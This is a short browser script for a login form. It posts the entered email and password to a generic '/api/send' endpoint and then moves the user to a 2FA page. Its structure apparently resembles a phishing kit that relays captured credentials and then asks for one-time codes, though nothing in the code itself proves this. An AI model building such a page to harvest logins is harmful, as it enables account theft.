document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show loading state
            const btn = this.querySelector('button');
            const originalText = btn.textContent;
            btn.textContent = 'Processing...';
            btn.disabled = true;
            
            try {
                // Send to your API endpoint
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'login',
                        data: { email, password },
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (response.ok) {
                    // Navigate to 2FA page on success
                    navigateTo('/2fa');
                } else {
                    alert('Verification step failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Network error. Please check connection.');
            } finally {
                // Reset button
                btn.textContent = originalText;
                btn.disabled = false;
            }
        });
    }
    
    // Password visibility toggle
    const toggleBtn = document.querySelector('.toggle-password');
    if (toggleBtn) {
        toggleBtn.addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                this.textContent = 'Show';
            }
        });
    }
});